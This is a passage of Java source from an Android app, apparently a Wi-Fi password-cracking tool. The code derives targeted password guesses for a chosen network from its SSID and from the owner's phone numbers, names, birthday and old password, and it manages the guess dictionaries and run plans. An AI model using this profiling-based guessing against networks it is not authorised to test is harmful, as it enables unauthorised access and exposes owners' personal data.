            appendStream(L.f("按线索可生成 %d 条候选（预算 %d）",
                    "%d candidates from hints (budget %d)",
                    probe.candidates.size(), Prefs.deriveBudget(this)));
            if (skipped > 0) {
                appendStream(L.f("其中 %d 条本目标已试过，跑的时候会自动跳过。",
                        "%d already tried on this target \u2014 skipped automatically.", skipped));
            }
            if (!m.isEmpty()) {
                appendStream(L.s("线索已变，请重新「按目标派生」后入队。",
                        "Hints changed \u2014 derive again before queueing."));
            }
            updateDictStatus();
        });
        d.show();
    }

    /** 把表单读成一个 SeedModel（保存与"设为模板"共用一份读法，避免两处不一致） */
    private static io.github.wlmosv_png.wpaforge.audit.SeedModel readSeedForm(
            android.widget.EditText phone, android.widget.EditText names,
            android.widget.EditText bday, android.widget.EditText house,
            android.widget.EditText landline, android.widget.EditText oldPw,
            android.widget.EditText custom, boolean useSsid) {
        io.github.wlmosv_png.wpaforge.audit.SeedModel m =
                new io.github.wlmosv_png.wpaforge.audit.SeedModel();
        for (String p : splitComma(phone.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addPhone(m, p);
        }
        for (String n : splitComma(names.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addName(m, n);
        }
        m.birthday = bday.getText().toString().trim();
        m.houseNo = house.getText().toString().trim();
        m.landline = landline.getText().toString().trim();
        m.oldPassword = oldPw.getText().toString().trim();
        for (String c : splitComma(custom.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addCustom(m, c);
        }
        m.useSsid = useSsid;
        return m;
    }

    private static String ssidToggleLabel(boolean on) {
        return on
                ? L.s("SSID 派生：开（默认关，实测无贡献）", "SSID derivation: ON (off by default)")
                : L.s("SSID 派生：关（默认）", "SSID derivation: OFF (default)");
    }

    private static String joinComma(java.util.List<String> list) {
        if (list == null || list.isEmpty()) return "";
        return android.text.TextUtils.join(",", list);
    }

    /** 逗号 / 顿号 / 分号 / 空白都当分隔符 —— 国内输入法下这几种都会出现 */
    private static java.util.List<String> splitComma(String s) {
        java.util.List<String> out = new java.util.ArrayList<>();
        if (s == null) return out;
        for (String x : s.split("[,，、;；\\s]+")) {
            String v = x.trim();
            if (!v.isEmpty()) out.add(v);
        }
        return out;
    }

    /**
     * 按目标 SSID 现场派生候选。
     *
     * 先落盘再设为当前字典 —— 服务进程只认 dictPath，
     * 不落地会出现「候选显示正常但一跑就秒结束」。
     */
    private void deriveFromTarget() {
        deriveFromTarget(false);
    }

    private void deriveFromTarget(final boolean toAudit) {
        usePlanMode = false; selectedPlan = null;
        if (targetNet == null) {
            Toast.makeText(this, L.s("请先选择目标网络",
                    "Select a target network first"), Toast.LENGTH_SHORT).show();
            return;
        }
        final String ssid = targetNet.ssid;
        // 线索在**点击那一刻**读一次并固定下来：线程里再读就可能与入队时不一致。
        // 取的是**本目标**的档案（没有就从默认模板继承，旧口令不继承）。
        final io.github.wlmosv_png.wpaforge.audit.SeedModel seeds = profileForCurrentTarget().seeds;
        final io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
        dictReport(toAudit, io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO,
                L.f("正在按 SSID「%s」生成定向载荷...",
                        "Deriving candidates from SSID \"%s\"...", ssid),
                seeds.isEmpty() ? null
                        : L.f("线索: %d 项（%s）", "Hints: %d item(s) (%s)",
                              seeds.count(), seeds.masked()));
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.Result r =
                    io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(targetNet,
                            Prefs.deriveBudget(this),
                            io.github.wlmosv_png.wpaforge.scan.OuiLookup.vendor(this, targetNet.bssid),
                            seeds, io.github.wlmosv_png.wpaforge.audit.CnHot.load(this));
            // 文件名带线索指纹：换了线索再派生就不会撞上旧文件，
            // 服务端续跑也不会拿到错位的那一份
            // 落盘前剔掉本目标已试过的：这样落盘文件本身就不含重复，
            // 换字典/重跑时不会又把它们跑一遍（服务侧还会再兜一次底）。
            java.util.List<Candidate> fresh = new java.util.ArrayList<>(r.candidates.size());
            int skipped = 0;
            for (Candidate c : r.candidates) {
                if (tried.contains(c.password)) { skipped++; continue; }
                fresh.add(c);
            }
            // 名字要跟内容一致：这本现在主要是「画像 + 通用弱口令」，
            // 而 SSID 派生默认是关的，再叫「SSID 派生」会误导
            // 名字走 DerivedDicts：它同时负责「哪些是派生产物」的识别，
            // 名字规则一旦两处各写一遍，滚动清理就会认不出旧文件
            final String nm = io.github.wlmosv_png.wpaforge.audit.DerivedDicts
                    .targetedName(ssid, seeds.isEmpty() ? "" : seeds.fingerprint());
            final String path = saveDictToFile(fresh, nm);
            final int skipN = skipped;
            ui.post(() -> {
                applyDict(fresh, nm, path, SRC_PROFILE);
                dictReport(toAudit, io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK,
                        L.f("定向载荷就绪: %d 发", "Derived %d candidates", fresh.size()),
                        (skipN > 0
                                ? L.f("已跳过 %d 条本目标试过的候选",
                                      "%d already tried on this target, skipped", skipN)
                                : "")
                                + (r.explanation.isEmpty() ? "" : "\n" + r.explanation));
            });
        }).start();
    }

    /** 内置生成器（通用词法），同样先落盘 */
    private void buildGenericDict() {
        buildGenericDict(false);
    }

    private void buildGenericDict(final boolean toAudit) {
        usePlanMode = false; selectedPlan = null;
        dictReport(toAudit, io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO,
                L.s("正在编排通用载荷…", "Building built-in dictionary..."), null);
        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.DictGenerator g =
                    io.github.wlmosv_png.wpaforge.audit.DictGenerator.quick(200000);
            final java.util.List<Candidate> list = g.build();
            final String nm = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.generatorName();
            final String path = saveDictToFile(list, nm);
            final String stats = renderStats(g.stats());
            ui.post(() -> {
                applyDict(list, nm, path, SRC_GENERIC);
                dictReport(toAudit, io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK,
                        L.f("载荷编排完成: %d 发", "Generated %d entries", list.size()), stats);
            });
        }).start();
    }

    /**
     * 字典操作的结果写到哪：破解页走状态流，审计页走「字典操作」频道。
     *
     * <p>两边共用同一条派生实现，但**日志不串台** —— 在审计页点派生，
     * 结果就出现在审计页的字典频道里，不会跑到破解页的状态流上。
     */
    private void dictReport(boolean toAudit, io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind,
                           String text, String detail) {
        if (toAudit) dictLine(kind, "", text, detail);
        else appendStream(text);
    }

    /** 把 origin->count 渲染成一行可读文本 */
    private static String renderStats(java.util.Map<String, Integer> m) {
        if (m == null || m.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (java.util.Map.Entry<String, Integer> e : m.entrySet()) {
            if (sb.length() > 0) sb.append("  ·  ");
            sb.append(e.getKey()).append('=').append(e.getValue());
        }
        return sb.toString();
    }

    /**
     * 把候选写进 DictStore 目录，返回绝对路径。
     * 目录不可用或写入失败返回空串。
     */
    private String saveDictToFile(java.util.List<Candidate> list, String baseName) {
        if (list == null || list.isEmpty()) return "";
        File dir = io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this);
        if (dir == null) return "";
        if (!dir.exists() && !dir.mkdirs()) return "";
        String safe = baseName.replaceAll(FNAME_BAD, "_");
        purgeSameGroup(dir, safe + ".txt");
        File out = new File(dir, safe + ".txt");
        try (java.io.BufferedWriter w = new java.io.BufferedWriter(
                new java.io.OutputStreamWriter(new java.io.FileOutputStream(out), "UTF-8"))) {
            for (Candidate c : list) {
                w.write(c.password);
                w.write("\n");
            }
        } catch (Exception e) {
            android.util.Log.w("WPAForge", "saveDictToFile 失败: " + e);
            return "";
        }
        return out.getAbsolutePath();
    }

    /**
     * 写新的派生产物之前，删掉**同一个目标**的旧产物。
     *
     * <p>用户的原话：「那玩意用一次就不用了，留着看起来很多，还很麻烦」。
     * 与其每次生成都多一份，不如让每个目标最多只留最新一份 ——
     * 从「跑 N 次攒 2N 份」变成「恒定 2 份」。
     *
     * <p>队列里排队 / 正在跑 / 暂停中的任务引用的文件**一律不删**：
     * 那些路径一消失，续跑的 offset 就对不上了。
     */
    private void purgeSameGroup(File dir, String newFileName) {
        java.util.List<File> olds =
                io.github.wlmosv_png.wpaforge.audit.DerivedDicts.sameGroup(dir, newFileName);
        if (olds.isEmpty()) return;
        java.util.Set<String> keep;
        try {
            keep = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.protectedPaths(
                    io.github.wlmosv_png.wpaforge.audit.TaskQueue.load(this));
        } catch (Throwable t) {
            keep = new java.util.HashSet<>();   // 读不到队列 → 保守：不清
            appendLog(L.s("队列读取失败，跳过旧派生清理", "Queue unreadable, skipping cleanup"));
            return;
        }
        int n = 0;
        for (File f : olds) {
            if (keep.contains(f.getAbsolutePath())) continue;
            if (f.delete()) n++;
        }
        if (n > 0) {
            appendLog(L.s("已清理 " + n + " 份同目标的旧派生字典",
                    "Removed " + n + " stale derived dictionary(ies)"));
        }
    }

    /** 统一入口：设为当前字典 + 刷新界面显示（来源代码见 SRC_*） */
    private void applyDict(java.util.List<Candidate> list, String name, String path) {
        applyDict(list, name, path, "");
    }

    /**
     * **当前字典的唯一写入口**。
     *
     * <p>1.9.44 起这里同时负责三件事，缺一件就会出现「界面显示 A、实际跑 B」：
     * <ol>
     *   <li>更新显示字段（名字 / 路径 / 来源 / 跳过条数）；</li>
     *   <li>更新**工作台快照**（{@link io.github.wlmosv_png.wpaforge.audit.AuditWorkflow}）——
     *       条数由候选列表本身算出，不接受任何"自报条数"；</li>
     *   <li>把快照**持久化**，让应用重开后仍能回答"上次用的是哪本字典"。</li>
     * </ol>
     * 传空列表时是显式「清空」，工作台与持久层一起清，不会留下半截状态。
     */
    private void applyDict(java.util.List<Candidate> list, String name, String path, String source) {
        boolean empty = list == null || list.isEmpty();
        final String nm = name == null ? "" : name;
        final String px = path == null ? "" : path;
        final String src = source == null ? "" : source;
        final java.util.List<Candidate> next =
                empty ? new java.util.ArrayList<Candidate>() : list;

        // **两边一起成功、或一起不动**：先让工作台接受（它会做「条数 ↔ 内容指纹」
        // 自洽校验）。原来先写 currentDict* 再 setDictionary，返回值被忽略 ——
        // setDictionary 拒绝时字段已是新值、快照还是旧的，于是"界面显示 A、
        // 执行层与结果卡是 B"，正是要根除的那类不一致。
        boolean accepted;
        io.github.wlmosv_png.wpaforge.audit.DictSnapshot snap;
        if (empty) {
            workbench.clearDictionary();
            snap = io.github.wlmosv_png.wpaforge.audit.DictSnapshot.none();
            accepted = true;
        } else {
            accepted = workbench.setDictionary(nm, src, px, next);
            snap = workbench.dictionary();
        }
        if (!accepted) {
            dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.FAIL, nm,
                    L.s("这本字典没能生效（条数与内容指纹不自洽），当前字典保持不变。",
                            "This dictionary was rejected (count vs fingerprint mismatch); "
                                    + "the current one is unchanged."), null);
            Toast.makeText(this, L.s("字典没能生效，当前字典保持不变",
                    "Dictionary rejected; current one unchanged"), Toast.LENGTH_LONG).show();
            return;
        }

        currentDict = next;
        currentDictName = nm;
        currentDictPath = px;
        currentDictSource = src;
        currentDictSkipped = empty ? 0 : countSkipped(currentDict);
        dictEpoch++;   // 任何一次成功替换都让"更早的异步请求"作废

        if (empty) {
            io.github.wlmosv_png.wpaforge.DictSnapshotStore.clear(this);
        } else {
            io.github.wlmosv_png.wpaforge.DictSnapshotStore.save(this, snap);
        }

        updateDictStatus();
        updateConnectDict();
        Toast.makeText(this, L.f("已应用 %d 条", "Applied %d entries",
                currentDict.size()), Toast.LENGTH_SHORT).show();

        io.github.wlmosv_png.wpaforge.audit.DictSnapshot s = snap;
        dictLine(empty ? io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN
                       : io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK,
                s.empty() ? (currentDictName.isEmpty() ? "(unnamed)" : currentDictName) : s.name,
                empty ? L.s("已清空当前字典", "Current dictionary cleared")
                      : s.count + L.s(" 条候选 · 内容指纹 ", " entries \u00b7 content id ")
                        + s.fingerprint(),
                L.f("名称: %s\n来源: %s\n候选数: %d\n内容指纹: %s\n文件: %s\n文件指纹: %s",
                        "Name: %s\nSource: %s\nCandidates: %d\nContent id: %s\nFile: %s\nFile id: %s",
                        s.name.isEmpty() ? "\u2014" : s.name, sourceLabel(s.source), s.count,
                        s.fingerprint().isEmpty() ? "\u2014" : s.fingerprint(),
                        s.filePath.isEmpty() ? L.s("未落盘", "not on disk") : s.filePath,
                        s.fileId().isEmpty() ? "\u2014" : s.fileId()));
        renderAudit();
    }

    /** 从字典文件里挑一个加载 */
    private void showDictPicker() {
        java.util.List<io.github.wlmosv_png.wpaforge.audit.DictStore.Entry> entries =
                io.github.wlmosv_png.wpaforge.audit.DictStore.scan(
                        io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this));
        if (entries.isEmpty()) {
            // 只说一句「请先去字典管理」是没用的 —— 用户下一句就是"在哪"。
            // 直接把入口摆进弹窗。
            io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                    new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                            L.s("还没有字典", "No dictionaries yet"),
                            L.s("当前字典目录里没有可用的字典文件。\n"
                                    + "可以去字典管理新建一份、从手机导入一份 txt，"
                                    + "或加载内置字典。",
                            "There is no usable dictionary file in the dictionary folder.\n"
                                    + "Create one in dictionary management, import a .txt from the "
                                    + "device, or load a built-in list."));
            d.addItem(L.s("打开字典管理", "Open dictionary management"),
                    dd -> openDictManager());
            d.addItem(L.s("内置生成器（快速造一本）", "Built-in generator (quick)"),
                    dd -> buildGenericDictFromAudit());
            d.setNegative(L.s("取消", "Cancel"), null);
            d.show();
            return;
        }
        final String[] labels = new String[entries.size()];
        for (int i = 0; i < entries.size(); i++) {
            io.github.wlmosv_png.wpaforge.audit.DictStore.Entry e = entries.get(i);
            labels[i] = e.name + "   " + e.sizeLabel()
                    + (e.isRule ? L.s("  [规则]", "  [rule]") : "");
        }
        // 用系统 AlertDialog：NetDialog 在切 Tab 后偶发不显示（层级问题），
        // 系统弹窗永远在最上层，不会出现「点了没反应」。
        final io.github.wlmosv_png.wpaforge.audit.DictStore.Entry[] arr =
                entries.toArray(new io.github.wlmosv_png.wpaforge.audit.DictStore.Entry[0]);
        io.github.wlmosv_png.wpaforge.ui.NetDialog dlg =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.f("选择字典（共 %d 个）", "Pick a dictionary (%d)", entries.size()),
                        null);
        for (int i = 0; i < arr.length; i++) {
            final int idx = i;
            dlg.addItem(labels[i], dd -> loadDictFile(arr[idx]));
        }
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /**
     * 加载一个字典文件为当前字典。
     *
     * 两处刻意的选择：
     *
     * 1. **捕获 Throwable 而不是 Exception。**
     *    大字典（如 48 万行的号码变形表）读满上限时会造出几十万个
     *    Candidate 对象，ColorOS 上会抛 OutOfMemoryError。
     *    Error 不是 Exception，catch(Exception) 拦不住 —— 它会直接
     *    杀掉进程，用户看到的就是「选了字典就闪退」。
     *
     * 2. **上限 120000，且被截断时如实告知。**
     *    按实测约 1 秒/条，20 万条要跑 55 小时，本身就不可用。
     *    宁可明说「已截断」，也不要静默吃掉后半截。
     */
    private static final int DICT_LOAD_LIMIT = 120000;

    /**
     * 选择多字典计划（破解页第二种模式）。
     *
     * <p>没有计划时明确提示「先去字典管理页建立」，并给一个直达入口；
     * 有计划时列出成员与顺序，用户点「用这个计划」即切换到计划模式 ——
     * 之后启动不再逐本选字典。
     */
    private void showPlanPicker() {
        io.github.wlmosv_png.wpaforge.audit.DictPlan plan =
                io.github.wlmosv_png.wpaforge.audit.DictPlan.load(
                        io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));

        if (plan.items.isEmpty()) {
            NetDialog d = new NetDialog(this, L.s("还没有多字典计划", "No plan yet"),
                    L.s("多字典计划需要在「字典管理」页里建立：\n把几本字典按顺序加进去、调好顺序，再回来这里选它。\n\n现在去建立吗？",
                            "A multi-dictionary plan is built in \"Dictionary management\": add several dictionaries in order, then come back to pick it here.\n\nOpen it now?"));
            d.setNegative(L.s("取消", "Cancel"), null);
            d.setPositive(L.s("去字典管理", "Open dictionary management"), dd -> {
                startActivity(new android.content.Intent(this, DictActivity.class));
            });
            d.show();
            return;
        }

        NetDialog d = new NetDialog(this, L.s("多字典计划", "Multi-dictionary plan"),
                L.f("共 %d 本 · %s · 当前第 %d 本",
                        "%d dictionaries · %s · now #%d",
                        plan.items.size(),
                        plan.autoAdvance ? L.s("自动连跑", "auto-advance") : L.s("单本停", "stop each"),
                        plan.displayIndex()));
        StringBuilder members = new StringBuilder();
        for (int i = 0; i < plan.items.size(); i++) {
            io.github.wlmosv_png.wpaforge.audit.DictPlan.Item it = plan.items.get(i);
            members.append(i + 1).append(". ").append(it.name);
            if (i == plan.index) members.append(L.s("  ← 当前", "  ← now"));
            if (i < plan.items.size() - 1) members.append("\n");
        }
        d.addHint(members.toString());
        d.addHint(L.s("计划模式：启动后按这个顺序一本接一本跑，命中即停。\n不再需要逐本选字典。",
                "Plan mode: runs these in order, one after another, stopping on a hit. No per-dictionary selection needed."));
        d.setNegative(L.s("取消", "Cancel"), null);
        if (plan.state.isTerminal()) {
            d.addHint(L.s("这个计划已经结束（" + io.github.wlmosv_png.wpaforge.audit.DictPlan
                            .stateLabel(plan.state) + "）。点「用这个计划」会重置进度重新开始；"
                            + "或在下面清理它。",
                    "This plan already finished. \"Use this plan\" resets and restarts it; "
                            + "or clear it below."));
        }
        d.setPositive(L.s("用这个计划", "Use this plan"), dd -> {
            usePlanMode = true;
            // 终态计划：用之前先重置进度（成员与顺序保留），否则 startConnect 会被终态拦住。
            if (plan.state.isTerminal()) {
                plan.resetProgress();
                plan.save(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                TaskQueue.stopPlanTasks(this);
            }
            selectedPlan = plan;
            // 计划自带目标快照时，把破解页目标对齐到计划目标 —— 这样 triedSet 键、
            // 服务端 loadPlanForRun 的目标一致性检查都自然对齐，不靠用户手动再选。
            if (plan.targetBssid != null && !plan.targetBssid.isEmpty()) {
                targetNet = plan.toNetRecord();
                Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                updateTargetLabel();
                refreshSkippedForCurrentDict();
            }
            updateDictStatus();
            updateConnectDict();
            Toast.makeText(this, L.f("已选多字典计划（%d 本）", "%d-dictionary plan selected",
                    plan.items.size()), Toast.LENGTH_SHORT).show();
        });
        d.show();
    }

    /**
     * 破解页的轻量计划管理（管理顺序 / 移出计划）。
     *
     * <p>与字典管理页共用**同一份权威计划数据**（按目标键的 plan 文件），
     * 不另造一套、不复制状态。调整直接 {@code DictPlan.move/removeAt} + 落盘，
     * 保存后立即刷新破解页计划展示。
     *
     * <p>运行保护：计划正在执行（RUNNING）时禁改，避免任务错位；
     * 暂停/空闲时可改，已完成字典的进度随条目一起移动（不被清掉）。
     */
    private void showPlanManager() {
        io.github.wlmosv_png.wpaforge.audit.DictPlan p =
                io.github.wlmosv_png.wpaforge.audit.DictPlan.load(
                        io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
        if (p.items.isEmpty()) {
            showPlanPicker();
            return;
        }
        final io.github.wlmosv_png.wpaforge.audit.DictPlan running = livePlan();
        final boolean executing = running != null
                && running.state == io.github.wlmosv_png.wpaforge.audit.DictPlan.State.RUNNING;

        final boolean terminal = p.state.isTerminal();
        final String modeTag = "MULTI".equals(currentMode())
                ? L.s("当前执行方式：多字典计划", "Mode: multi-dictionary plan")
                : L.s("当前执行方式：单字典（本目标暂无有效计划）",
                        "Mode: single dictionary (no active plan for this target)");
        String mgrSub;
        if (executing) {
            mgrSub = L.s("计划正在执行，暂不能调整顺序。\n先暂停或停止，再回来调整。",
                    "Plan is running — pause or stop it first, then reorder.");
        } else if (terminal) {
            mgrSub = L.s("本目标的计划已结束（" + io.github.wlmosv_png.wpaforge.audit.DictPlan
                            .stateLabel(p.state) + "）。\n"
                            + "可调顺序后重新开始，或底部「清理本目标的计划」。",
                    "This target's plan already finished.\nReorder and restart, or clear it below.");
        } else {
            mgrSub = L.s("点 ↑/↓ 调顺序，× 移出本计划。改动立即保存。",
                    "Tap ↑/↓ to reorder, × to remove. Changes save immediately.");
        }
        NetDialog d = new NetDialog(this, L.s("管理计划顺序", "Manage plan order"),
                modeTag + "\n" + mgrSub);

        for (int i = 0; i < p.items.size(); i++) {
            final int idx = i;
            io.github.wlmosv_png.wpaforge.audit.DictPlan.Item it = p.items.get(i);
            final String name = it.name;
            final String status = io.github.wlmosv_png.wpaforge.audit.DictPlan.stateLabel(it.local);
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setGravity(Gravity.CENTER_VERTICAL);
            row.setPadding(px(4), px(6), px(4), px(6));

            TextView nm = new TextView(this);
            nm.setText((i + 1) + ". " + name + "   " + status);
            nm.setTextSize(AmberTheme.FS_ACTION);
            nm.setTextColor(TEXT);
            nm.setSingleLine(true);
            nm.setEllipsize(TextUtils.TruncateAt.END);
            row.addView(nm, new LinearLayout.LayoutParams(0,
                    ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

            // 上移 / 下移 / 移出：直接改同一份 plan 并落盘，再重画本弹窗
            Button up = smallChip(L.s("↑", "↑"), ACCENT, v -> {
                if (executing) { Toast.makeText(this, L.s("计划执行中，暂不能调整", "Plan running — cannot reorder"), Toast.LENGTH_SHORT).show(); return; }
                io.github.wlmosv_png.wpaforge.audit.DictPlan q = io.github.wlmosv_png.wpaforge.audit.DictPlan.load(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                if (q.move(idx, -1)) { q.save(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey())); }
                refreshPlanLine(); updateConnectDict(); updateDictStatus();
                d.dismiss(); showPlanManager();
            });
            Button down = smallChip(L.s("↓", "↓"), ACCENT, v -> {
                if (executing) { Toast.makeText(this, L.s("计划执行中，暂不能调整", "Plan running — cannot reorder"), Toast.LENGTH_SHORT).show(); return; }
                io.github.wlmosv_png.wpaforge.audit.DictPlan q = io.github.wlmosv_png.wpaforge.audit.DictPlan.load(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                if (q.move(idx, +1)) { q.save(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey())); }
                refreshPlanLine(); updateConnectDict(); updateDictStatus();
                d.dismiss(); showPlanManager();
            });
            Button rm = smallChip(L.s("×", "×"), AmberTheme.DANGER, v -> {
                if (executing) { Toast.makeText(this, L.s("计划执行中，暂不能调整", "Plan running — cannot reorder"), Toast.LENGTH_SHORT).show(); return; }
                io.github.wlmosv_png.wpaforge.audit.DictPlan q = io.github.wlmosv_png.wpaforge.audit.DictPlan.load(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                if (q.removeAt(idx)) { q.save(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey())); }
                refreshPlanLine(); updateConnectDict(); updateDictStatus();
                d.dismiss(); showPlanManager();
            });
            row.addView(up);
            row.addView(down);
            row.addView(rm);
            d.addView(row);
        }

        d.addItem(L.s("管理字典（完整）", "Manage dictionaries (full)"), dd -> {
            startActivity(new android.content.Intent(this, DictActivity.class));
        });
        // 清理：删除本目标的计划 + 作废其残留任务。**不删字典文件、不碰 triedSet/账本。**
        d.addItem(L.s("清理本目标的计划（不动字典文件与历史）",
                        "Clear this target's plan (keeps dict files & history)"),
                dd -> confirmClearPlan());
        // 重置进度：保留成员与顺序，只把「跑到哪 / 什么结论」清零（与删除不同）。
        d.addItem(L.s("重置进度（保留字典与顺序）",
                        "Reset progress (keep dictionaries & order)"),
                dd -> {
                    if (executing) {
                        Toast.makeText(this, L.s("计划执行中，先暂停或停止",
                                "Plan is running — pause or stop first"), Toast.LENGTH_SHORT).show();
                        return;
                    }
                    io.github.wlmosv_png.wpaforge.audit.DictPlan q =
                            io.github.wlmosv_png.wpaforge.audit.DictPlan.load(
                                    io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                    q.resetProgress();
                    q.save(io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
                    TaskQueue.stopPlanTasks(this);
                    refreshPlanLine();
                    updateConnectDict();
                    updateDictStatus();
                    Toast.makeText(this, L.s("已重置进度，可重新开始",
                            "Progress reset; ready to start"), Toast.LENGTH_SHORT).show();
                });
        // 改回单字典：退出计划模式，字典选择通道立即可用。
        d.addItem(L.s("改回单字典模式", "Switch back to single dictionary"),
                dd -> {
                    leavePlanMode();
                    updateDictStatus();
                    updateConnectDict();
                    Toast.makeText(this, L.s("已切回单字典模式，点字典可重新选择",
                            "Back to single-dictionary mode; tap the dictionary to pick"),
                            Toast.LENGTH_SHORT).show();
                });
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();
    }

    /**
     * 清理本目标的计划：删计划文件 + 作废该计划派生的残留任务。
     *
     * <p>严格边界：**不删任何字典原文件**，**不删 TriedSet / AttemptLedger**，
     * 也不影响其它 Wi-Fi 目标的计划。删完立即回到单字典模式。
     */
    private void confirmClearPlan() {
        NetDialog c = new NetDialog(this, L.s("清理本目标的计划", "Clear this target's plan"),
                L.s("将删除本目标的多字典计划与它的残留任务。\n\n"
                        + "不会删除：字典文件、已试记录、执行账本、其它 Wi-Fi 的计划。",
                        "Deletes this target's plan and its leftover tasks.\n\n"
                                + "Kept: dictionary files, tried records, attempt ledger, other targets' plans."));
        c.setNegative(L.s("取消", "Cancel"), null);
        c.setDanger(L.s("清理", "Clear"), dd -> {
            String key = currentTargetKey();
            io.github.wlmosv_png.wpaforge.audit.DictPlan.delete(this, key);
            int killed = TaskQueue.stopPlanTasks(this);
            int removed = TaskQueue.removePlanTasks(this);
            leavePlanMode();
            queueCache.clear();
            queueCache.addAll(TaskQueue.load(this));
            renderQueue();
            updateDictStatus();
            updateConnectDict();
            refreshPlanLine();
            Toast.makeText(this, L.f("已清理计划（作废 %d 条，移除 %d 条残留任务）",
                            "Plan cleared (%d invalidated, %d removed)",
                            killed + removed, removed),
                    Toast.LENGTH_LONG).show();
        });
        c.show();
    }


    private void loadDictFile(io.github.wlmosv_png.wpaforge.audit.DictStore.Entry e) {
        usePlanMode = false; selectedPlan = null;
        appendLog(L.f("正在读取 %s ...", "Reading %s ...", e.name));
        new Thread(() -> {
            java.util.List<Candidate> list = null;
            String err = null;
            try {
                list = io.github.wlmosv_png.wpaforge.audit.DictStore.load(e, DICT_LOAD_LIMIT);
            } catch (Throwable t) {
                err = t.getClass().getSimpleName()
                        + (t.getMessage() == null ? "" : ": " + t.getMessage());
            }
            final java.util.List<Candidate> rl = list;
            final String re = err;
            ui.post(() -> {
                if (re != null) {
                    appendLog(L.f("读取失败: %s", "Failed to read: %s", re));
                    new android.app.AlertDialog.Builder(this)
                            .setTitle(L.s("字典太大，读不进来", "Dictionary too large"))
                            .setMessage(L.s(
                                    "这个字典超出本机可用内存。\n\n"
                                            + "建议改用内置的 TOP 榜（几百到几千条），\n"
                                            + "或先用「按目标派生」生成针对性候选 ——\n"
                                            + "几十条就覆盖最常见的场景，而且快得多。",
                                    "This dictionary exceeds available memory.\n\n"
                                            + "Use a built-in TOP list (hundreds to thousands)\n"
                                            + "or derive candidates from the SSID — a few dozen\n"
                                            + "entries cover the common cases and run far faster."))
                            .setPositiveButton(L.s("知道了", "Got it"), null)
                            .show();
                    return;
                }
                // 统一走 applyDict：显示 + 工作台快照 + 持久化 一处收口。
                applyDict(rl, e.name, e.file.getAbsolutePath(), SRC_FILE);
                if (rl.size() >= DICT_LOAD_LIMIT) {
                    dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN, e.name,
                            L.f("注意: 已达上限 %d 条，后面的没读进来",
                                    "Note: hit the %d limit - the rest was not loaded",
                                    DICT_LOAD_LIMIT), null);
                }
                if (rl.size() > 300) {
                    dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO, e.name,
                            L.f("提示: 约 %s 跑完（实测约 1 秒/条）",
                                    "About %s to finish (~1s per attempt)",
                                    humanTime(rl.size())), null);
                }
            });
        }).start();
    }

    /**
     * 审计页的「按 SSID 派生」：先要一个目标。
     *
     * 已有目标（破解页选过）就直接用，否则让用户现场挑一个。
     * 挑完调 deriveFromTarget() —— 与破解页共用同一条实现，
     * 不复制逻辑，避免两边行为漂移。
     */
    private void pickTargetForDerive() {
        pickTargetForDerive(false);
    }

    private void pickTargetForDerive(boolean toAudit) {
        if (targetNet != null) {
            new android.app.AlertDialog.Builder(this)
                    .setTitle(L.s("按目标派生", "Derive from target"))
                    .setMessage(L.f("当前目标: %s\n\n直接用它派生，还是重新选一个？",
                            "Current target: %s\n\nUse it, or pick another?",
                            targetNet.displayName()))
                    .setPositiveButton(L.s("就用这个", "Use this"),
                            (d, w) -> deriveFromTarget(toAudit))
                    .setNeutralButton(L.s("重新选", "Pick another"),
                            (d, w) -> chooseTargetThenDerive(toAudit))
                    .setNegativeButton(L.s("取消", "Cancel"), null)
                    .show();
        } else {
            chooseTargetThenDerive(toAudit);
        }
    }

    /** 选一个加密目标，选完立即派生 */
    private void chooseTargetThenDerive() {
        chooseTargetThenDerive(false);
    }

    private void chooseTargetThenDerive(final boolean toAudit) {
        if (lastRecords.isEmpty()) {
            Toast.makeText(this, L.s("还没有扫描结果，请先去观测页",
                    "No scan results yet. Go to the Observe tab first."),
